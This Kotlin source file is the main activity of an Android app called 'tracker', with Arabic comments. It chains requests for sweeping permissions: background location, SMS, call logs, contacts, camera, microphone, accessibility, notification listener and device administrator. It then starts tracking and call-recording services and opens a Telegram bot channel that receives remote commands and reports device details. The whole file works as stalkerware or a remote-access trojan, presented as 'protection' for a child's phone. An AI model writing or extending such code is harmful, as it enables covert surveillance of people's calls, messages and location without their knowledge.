package com.abuzahra.tracker

import android.Manifest
import android.app.ActivityManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker
import com.abuzahra.tracker.services.MainTrackerService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    lateinit var webView: WebView
    private val PERMISSIONS_REQUEST_CODE = 101
    private var isSetupComplete = false

    /**
     * مراحل الأذونات - كل مرحلة تتطلب إجراء مختلف
     * ٧ مراحل شاملة تشمل تفعيل مسؤول الجهاز
     */
    private enum class SetupStep(val id: Int) {
        BASIC_RUNTIME(0),          // أذونات التشغيل العادية (نافذة واحدة)
        BATTERY_OPTIMIZATION(1),   // تجاهل تحسين البطارية
        OVERLAY(2),                // عرض فوق التطبيقات
        USAGE_STATS(3),            // إحصائيات الاستخدام
        NOTIFICATION_LISTENER(4),  // مستمع الإشعارات
        ACCESSIBILITY(5),          // خدمة إمكانية الوصول
        DEVICE_ADMIN(6);           // تفعيل مسؤول الجهاز (جديد)

        fun next(): SetupStep? = entries.getOrNull(id + 1)
    }

    private var currentStep: SetupStep = SetupStep.BASIC_RUNTIME

    // ==================== ==================== ====================
    //      قائمة أذونات التشغيل الشاملة
    // ==================== ==================== ====================

    private val runtimePermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.ANSWER_PHONE_CALLS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.BODY_SENSORS,
        Manifest.permission.ACTIVITY_RECOGNITION
    )

    // ==================== ==================== ====================
    //      دورة حياة النشاط (Activity Lifecycle)
    // ==================== ==================== ====================

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        webView = findViewById(R.id.webview)
        setupWebView()

        // ==================== استمرارية الجلسة ====================
        // التحقق مما إذا كان التفعيل قد اكتمل سابقاً
        if (SharedPrefsManager.isSetupCompleted(this)) {
            Log.d("MainActivity", "✅ التفعيل مكتمل سابقاً - تخطي مرحلة الأذونات")
            isSetupComplete = true
            currentStep = SetupStep.entries.last()
            val deviceInfo = buildDeviceInfoHtml()
            jsCall("onAllPermissionsComplete('$deviceInfo')")
            jsNotify("onPermissionStep", "7")
            recoverSession()
        } else {
            Log.d("MainActivity", "🔄 التفعيل لم يكتمل بعد - بدء مراحل الأذونات")
            checkAndRequestPermissions()
        }
    }

    /**
     * إعداد WebView مع تفعيل JavaScript والواجهة الأصلية
     */
    private fun setupWebView() {
        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        webSettings.allowFileAccess = true
        webView.addJavascriptInterface(ChildWebInterface(this), "AndroidNative")
        webView.webViewClient = WebViewClient()
        webView.loadUrl("file:///android_asset/child_index.html")
    }

    // ==================== ==================== ====================
    //      استعادة الجلسة (Session Recovery)
    // ==================== ==================== ====================

    /**
     * استعادة الجلسة عند إعادة تشغيل التطبيق
     * يتحقق مما إذا كانت الخدمات تعمل بالفعل
     */
    private fun recoverSession() {
        if (isServiceRunning(MainTrackerService::class.java)) {
            // الخدمات تعمل بالفعل - فقط أعد الاتصال بتيليجرام
            Log.d("MainActivity", "📡 الخدمات تعمل بالفعل - إعادة الاتصال بتيليجرام")
            val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
            CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                try {
                    TelegramDirectClient.startCommandPolling(this@MainActivity)
                    delay(2000)
                    TelegramDirectClient.sendMessage(
                        "🔄 <b>تم إعادة الاتصال بنجاح!</b>\n\n" +
                        "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
                        "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
                        "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
                        "🆔 معرف: <code>$deviceId</code>\n\n" +
                        "🟢 التطبيق كان يعمل - أعيد الاتصال\n" +
                        "📡 جاري استقبال الأوامر...",
                        "HTML"
                    )
                    jsCall("onTelegramConnected('تم إعادة الاتصال بتيليجرام بنجاح')")
                } catch (e: Exception) {
                    Log.e("MainActivity", "خطأ في إعادة الاتصال بتيليجرام: ${e.message}")
                    jsCall("onSetupError('خطأ في إعادة الاتصال بتيليجرام: ${e.message}')")
                }
            }
        } else {
            // الخدمات غير تعمل - أعد تشغيلها
            Log.d("MainActivity", "🚀 الخدمات متوقفة - إعادة تشغيلها...")
            startAllServices()
            ensureDeviceId()
            val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
            CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                try {
                    TelegramDirectClient.startCommandPolling(this@MainActivity)
                    delay(2000)
                    TelegramDirectClient.sendMessage(
                        "🔄 <b>تم إعادة تشغيل التطبيق!</b>\n\n" +
                        "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
                        "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
                        "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
                        "🆔 معرف: <code>$deviceId</code>\n\n" +
                        "🟢 تم إعادة تشغيل الخدمات\n" +
                        "📡 جاري استقبال الأوامر...",
                        "HTML"
                    )
                    jsCall("onTelegramConnected('تم إعادة تشغيل الاتصال بتيليجرام')")
                } catch (e: Exception) {
                    Log.e("MainActivity", "خطأ في الاتصال بتيليجرام بعد إعادة التشغيل: ${e.message}")
                    jsCall("onSetupError('خطأ في الاتصال بتيليجرام: ${e.message}')")
                }
            }
        }
    }

    /**
     * التحقق مما إذا كانت خدمة معينة تعمل حالياً
     */
    @Suppress("DEPRECATION")
    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        return manager.getRunningServices(Int.MAX_VALUE)
            .any { it.service.className == serviceClass.name }
    }

    // ==================== ==================== ====================
    //      نظام الأذونات المتقدم (Advanced Permission System)
    // ==================== ==================== ====================

    /**
     * البداية: طلب الأذونات حسب المرحلة الحالية
     */
    private fun checkAndRequestPermissions() {
        val step = currentStep
        jsNotify("onPermissionStep", (step.id + 1).toString())

        when (step) {
            SetupStep.BASIC_RUNTIME -> requestBasicPermissions()
            SetupStep.BATTERY_OPTIMIZATION -> requestBatteryOptimization()
            SetupStep.OVERLAY -> requestOverlayPermission()
            SetupStep.USAGE_STATS -> requestUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> requestNotificationPermission()
            SetupStep.ACCESSIBILITY -> requestAccessibilityPermission()
            SetupStep.DEVICE_ADMIN -> requestDeviceAdminPermission()
        }
    }

    // ==================== ==================== ====================
    //  الخطوة ١: الأذونات الأساسية (مع تصفية ذكية حسب إصدار أندرويد)
    // ==================== ==================== ====================

    private fun requestBasicPermissions() {
        jsNotify("onPermissionPending", "perm-basic")

        // تصفية الأذونات بناءً على إصدار أندرويد الحالي
        val supportedPermissions = runtimePermissions.filter { perm ->
            when (perm) {
                // أندرويد ١٣+ (Tiramisu): أذونات الوسائط والإشعارات والحساسات
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.BODY_SENSORS,
                Manifest.permission.ACTIVITY_RECOGNITION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                // أندرويد ١٠+ (Q): الموقع في الخلفية
                Manifest.permission.ACCESS_BACKGROUND_LOCATION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                // أندرويد ٩+ (P): الرد على المكالمات
                Manifest.permission.ANSWER_PHONE_CALLS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
                // إزالة كتابة التخزين لأندرويد ١٠+ (تم استبدالها بأذونات الوسائط)
                Manifest.permission.WRITE_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
                // الباقي مسموح لجميع الإصدارات
                else -> true
            }
        }

        // التحقق من الأذونات المفقودة فقط
        val missing = supportedPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, PERMISSIONS_REQUEST_CODE)
        } else {
            // الأذونات الأساسية مفعّلة بالفعل
            Log.d("MainActivity", "✅ جميع الأذونات الأساسية مفعّلة مسبقاً")
            jsNotify("onPermissionGranted", "perm-basic")
            advanceToNextStep()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            // التحقق مما إذا تم منح أذونات الموقع الحرجة
            val locationGranted = grantResults.isNotEmpty() &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED

            if (locationGranted) {
                Log.d("MainActivity", "✅ تم منح أذونات الموقع الأساسية")
                jsNotify("onPermissionGranted", "perm-basic")
            } else {
                Log.w("MainActivity", "⚠️ بعض الأذونات لم تُمنح - نكمل التفعيل")
                jsNotify("onPermissionGranted", "perm-basic") // نكمل حتى بدون كل الأذونات
            }
            // نكمل للخطوة التالية حتى لو لم تُمنح كل الأذونات
            advanceToNextStep()
        }
    }

    // ==================== ==================== ====================
    //  الخطوة ٢: تحسين البطارية
    // ==================== ==================== ====================

    private fun requestBatteryOptimization() {
        jsNotify("onPermissionPending", "perm-battery")
        val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (pwrm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d("MainActivity", "✅ تحسين البطارية مُلغى مسبقاً")
            jsNotify("onPermissionGranted", "perm-battery")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, SetupStep.BATTERY_OPTIMIZATION.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب تحسين البطارية: ${e.message}")
                jsNotify("onPermissionGranted", "perm-battery")
                advanceToNextStep()
            }
        }
    }

    // ==================== ==================== ====================
    //  الخطوة ٣: العرض فوق التطبيقات
    // ==================== ==================== ====================

    private fun requestOverlayPermission() {
        jsNotify("onPermissionPending", "perm-overlay")
        if (Settings.canDrawOverlays(this)) {
            Log.d("MainActivity", "✅ إذن العرض فوق التطبيقات مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "perm-overlay")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivityForResult(intent, SetupStep.OVERLAY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن العرض: ${e.message}")
                jsNotify("onPermissionGranted", "perm-overlay")
                advanceToNextStep()
            }
        }
    }

    // ==================== ==================== ====================
    //  الخطوة ٤: إحصائيات الاستخدام
    // ==================== ==================== ====================

    private fun requestUsageStatsPermission() {
        jsNotify("onPermissionPending", "perm-usage")
        if (hasUsageStatsPermission()) {
            Log.d("MainActivity", "✅ إذن إحصائيات الاستخدام مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "perm-usage")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), SetupStep.USAGE_STATS.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الاستخدام: ${e.message}")
                jsNotify("onPermissionGranted", "perm-usage")
                advanceToNextStep()
            }
        }
    }

    // ==================== ==================== ====================
    //  الخطوة ٥: مستمع الإشعارات
    // ==================== ==================== ====================

    private fun requestNotificationPermission() {
        jsNotify("onPermissionPending", "perm-notif")
        if (isNotificationServiceEnabled()) {
            Log.d("MainActivity", "✅ مستمع الإشعارات مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "perm-notif")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), SetupStep.NOTIFICATION_LISTENER.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الإشعارات: ${e.message}")
                jsNotify("onPermissionGranted", "perm-notif")
                advanceToNextStep()
            }
        }
    }

    // ==================== ==================== ====================
    //  الخطوة ٦: إمكانية الوصول
    // ==================== ==================== ====================

    private fun requestAccessibilityPermission() {
        jsNotify("onPermissionPending", "perm-access")
        if (isAccessibilityServiceEnabled()) {
            Log.d("MainActivity", "✅ خدمة إمكانية الوصول مفعّلة مسبقاً")
            jsNotify("onPermissionGranted", "perm-access")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), SetupStep.ACCESSIBILITY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الوصول: ${e.message}")
                jsNotify("onPermissionGranted", "perm-access")
                advanceToNextStep()
            }
        }
    }

    // ==================== ==================== ====================
    //  الخطوة ٧: مسؤول الجهاز (جديد)
    // ==================== ==================== ====================

    private fun requestDeviceAdminPermission() {
        jsNotify("onPermissionPending", "perm-admin")
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(componentName)) {
            Log.d("MainActivity", "✅ مسؤول الجهاز مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "perm-admin")
            onAllSetupComplete()
        } else {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                startActivityForResult(intent, SetupStep.DEVICE_ADMIN.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب تفعيل مسؤول الجهاز: ${e.message}")
                jsNotify("onPermissionGranted", "perm-admin")
                onAllSetupComplete()
            }
        }
    }

    // ==================== ==================== ====================
    //      onResume - مفتاح سلسلة الأذونات المتتابعة
    // ==================== ==================== ====================

    override fun onResume() {
        super.onResume()
        // عند عودة المستخدم من صفحة إعدادات النظام، نتحقق من الإذن
        // ونكمل للخطوة التالية تلقائياً
        if (!isSetupComplete) {
            // ننتظر قليلاً ثم نتحقق من الحالة الحالية
            // هذا يعطي النظام وقت لتحديث حالة الإذن
            webView.postDelayed({
                checkCurrentStepAndAdvance()
            }, 800)
        }
    }

    /**
     * التحقق من الإذن الحالي وتكملة السلسلة
     */
    private fun checkCurrentStepAndAdvance() {
        val granted = when (currentStep) {
            SetupStep.BASIC_RUNTIME -> true // تم معالجتها في onRequestPermissionsResult
            SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
            SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
            SetupStep.USAGE_STATS -> hasUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> isNotificationServiceEnabled()
            SetupStep.ACCESSIBILITY -> isAccessibilityServiceEnabled()
            SetupStep.DEVICE_ADMIN -> isDeviceAdminActive()
        }

        if (granted) {
            val stepName = when (currentStep) {
                SetupStep.BASIC_RUNTIME -> "perm-basic"
                SetupStep.BATTERY_OPTIMIZATION -> "perm-battery"
                SetupStep.OVERLAY -> "perm-overlay"
                SetupStep.USAGE_STATS -> "perm-usage"
                SetupStep.NOTIFICATION_LISTENER -> "perm-notif"
                SetupStep.ACCESSIBILITY -> "perm-access"
                SetupStep.DEVICE_ADMIN -> "perm-admin"
            }
            Log.d("MainActivity", "✅ تم منح الإذن: $stepName")
            jsNotify("onPermissionGranted", stepName)
            advanceToNextStep()
        }
        // إذا لم يُمنح الإذن، ننتظر onResume التالي (المستخدم يعود مرة أخرى)
    }

    /**
     * الانتقال للخطوة التالية في سلسلة الأذونات
     */
    private fun advanceToNextStep() {
        val next = currentStep.next()
        if (next != null) {
            currentStep = next
            checkAndRequestPermissions()
        } else {
            onAllSetupComplete()
        }
    }

    // ==================== ==================== ====================
    //      اكتمال التفعيل (Setup Complete)
    // ==================== ==================== ====================

    private fun onAllSetupComplete() {
        if (isSetupComplete) return
        isSetupComplete = true

        Log.d("MainActivity", "✅ جميع الأذونات مكتملة - بدء التشغيل")
        Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()

        // ==================== حفظ حالة التفعيل ====================
        // حفظ علامة اكتمال التفعيل في SharedPreferences لاستمرارية الجلسة
        SharedPrefsManager.markSetupCompleted(this)

        // بدء جميع الخدمات
        startAllServices()

        // حفظ معرف الجهاز وتحديث الواجهة
        ensureDeviceId()

        // إرسال معلومات الجهاز للواجهة
        val deviceInfo = buildDeviceInfoHtml()
        jsCall("onAllPermissionsComplete('$deviceInfo')")

        // الاتصال بتيليجرام مباشرة
        val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                TelegramDirectClient.startCommandPolling(this@MainActivity)
                delay(2000)
                TelegramDirectClient.sendMessage(
                    "✅ <b>تم تشغيل التطبيق بنجاح!</b>\n\n" +
                    "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
                    "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
                    "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
                    "🆔 معرف: <code>$deviceId</code>\n\n" +
                    "🟢 متصل مباشرة بتيليجرام\n" +
                    "📡 جاري استقبال الأوامر...",
                    "HTML"
                )
                jsCall("onTelegramConnected('تم الاتصال بتيليجرام بنجاح')")
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في الاتصال بتيليجرام: ${e.message}")
                jsCall("onSetupError('خطأ في الاتصال بتيليجرام: ${e.message}')")
            }
        }
    }

    // ==================== ==================== ====================
    //      إدارة الجهاز والخدمات
    // ==================== ==================== ====================

    /**
     * التأكد من وجود معرف فريد للجهاز
     */
    private fun ensureDeviceId() {
        if (SharedPrefsManager.getDeviceId(this) == null) {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: System.currentTimeMillis().toString()
            SharedPrefsManager.saveData(this, "direct_telegram", androidId)
        }
    }

    /**
     * بناء معلومات الجهاز بصيغة HTML
     */
    private fun buildDeviceInfoHtml(): String {
        return "📱 الموديل: <b>${Build.MODEL}</b><br>" +
               "🏢 الشركة: <b>${Build.BRAND}</b><br>" +
               "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b> (API ${Build.VERSION.SDK_INT})<br>" +
               "🆔 المعرف: <code>${SharedPrefsManager.getDeviceId(this) ?: "غير معروف"}</code><br>" +
               "🟢 الحالة: متصل بتيليجرام مباشرة"
    }

    /**
     * بدء جميع خدمات التتبع
     */
    private fun startAllServices() {
        try {
            Log.d("MainActivity", "🚀 بدء تشغيل جميع الخدمات...")
            val trackerIntent = Intent(this, MainTrackerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)

            val callIntent = Intent(this, CallRecorderService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)

            DataSyncWorker.startImmediate(this)
            Log.d("MainActivity", "✅ تم بدء جميع الخدمات بنجاح")
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في بدء الخدمات: ${e.message}", e)
        }
    }

    // ==================== ==================== ====================
    //      دوال مساعدة (Helper Functions)
    // ==================== ==================== ====================

    /**
     * التحقق مما إذا كان تحسين البطارية مُلغى
     */
    private fun isIgnoringBattery(): Boolean {
        return (getSystemService(Context.POWER_SERVICE) as PowerManager)
            .isIgnoringBatteryOptimizations(packageName)
    }

    /**
     * التحقق من إذن إحصائيات الاستخدام
     */
    private fun hasUsageStatsPermission(): Boolean {
        return try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), packageName
            ) == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص إذن الاستخدام: ${e.message}")
            false
        }
    }

    /**
     * التحقق مما إذا كان مستمع الإشعارات مفعّلاً
     */
    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    /**
     * التحقق مما إذا كانت خدمة إمكانية الوصول مفعّلة
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
            if (enabled != 1) return false
            val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (settingValue != null) {
                val splitter = TextUtils.SimpleStringSplitter(':')
                splitter.setString(settingValue)
                while (splitter.hasNext()) {
                    if (splitter.next().equals("${packageName}/com.abuzahra.tracker.services.MyAccessibilityService", ignoreCase = true)) {
                        return true
                    }
                }
            }
            false
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص خدمة إمكانية الوصول: ${e.message}")
            false
        }
    }

    /**
     * التحقق مما إذا كان مسؤول الجهاز مفعّلاً
     */
    private fun isDeviceAdminActive(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
            dpm.isAdminActive(componentName)
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص مسؤول الجهاز: ${e.message}")
            false
        }
    }

    // ==================== ==================== ====================
    //      جسر JavaScript (JavaScript Bridge)
    // ==================== ==================== ====================

    /**
     * إرسال إشعار JavaScript للواجهة
     */
    private fun jsNotify(method: String, arg: String) {
        webView.post {
            try {
                webView.evaluateJavascript("window.$method('$arg')", null)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ JS: ${e.message}")
            }
        }
    }

    /**
     * تنفيذ أمر JavaScript مباشر في الواجهة
     */
    private fun jsCall(script: String) {
        webView.post {
            try {
                webView.evaluateJavascript(script, null)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ JS: ${e.message}")
            }
        }
    }

    /**
     * بدء مهمة مزامنة البيانات
     */
    fun startWorker() { DataSyncWorker.startImmediate(this) }
}
